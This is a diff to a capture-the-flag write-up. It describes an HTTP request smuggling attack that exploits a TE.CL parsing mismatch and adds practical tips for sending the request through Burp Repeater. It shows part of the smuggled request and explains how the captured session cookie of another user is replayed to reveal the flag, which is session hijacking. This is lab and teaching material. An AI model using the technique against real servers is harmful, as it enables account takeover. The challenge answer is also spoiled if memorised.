@@ -27,7 +27,7 @@ on the /transmission endpoint by right clicking on the POST request in Burp Repe
 
 ### Exploit
 
-To solve the challenge, an HTTP request should be smuggled to the backend by abusing a TE.CL mismatch, the exploit can performed as seen below:
+To solve the challenge, an HTTP request should be smuggled to the backend by abusing a TE.CL mismatch, the exploit can performed as seen below: (if it is done using BurpSuite Repeater, "Update Content-Length" should be turned off, also very important to have an new line after the 0)
 
 ```http
 GET /post/2 HTTP/1.1
@@ -44,6 +44,7 @@ postId=2&name=attacker&transmission=iamgroot
 
 
 0
+
 ```
 
 After performing the above request a transmission would be posted on the webpage, this transmission will include a session cookie, when this session cookie is attached to a GET request for /profile the flag will be revealed, the request can look like this:
@@ -53,8 +54,6 @@ GET /profile HTTP/1.1
 Host: HOST:PORT
 Cookie: session=value
 ```
-
-One valid automated solution can be found in **solve.sh**
 
 ### Note: 
 > The solution may vary (not conceptually, but technically):
